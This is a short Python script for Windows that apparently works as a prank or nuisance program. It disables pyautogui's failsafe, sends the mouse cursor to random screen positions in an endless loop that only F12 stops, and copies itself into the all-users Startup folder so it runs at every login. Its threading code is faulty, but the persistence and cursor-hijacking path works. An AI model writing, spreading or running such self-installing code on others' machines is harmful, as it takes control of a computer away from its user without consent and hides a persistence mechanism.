import pyautogui as gui
gui.FAILSAFE = False
import keyboard
import sys
import shutil
import random as r
import os
import threading
def move():
    while True:
        if keyboard.is_pressed('F12') == True:
            sys.exit()
        gui.moveTo(r.randint(0,1919),r.randint(0,1070))
threads = []
t1=threading.Thread(move())
threads.append(t1)
f = os.path.exists(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\movemouse.exe")
if f == True:
    try:
        if __name__ == "__main__":
             for t in threads:
                  t.start()
    except Exception as e:
        print(e)
else:
    shutil.copy(sys.argv[0],r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
    while True:
        move()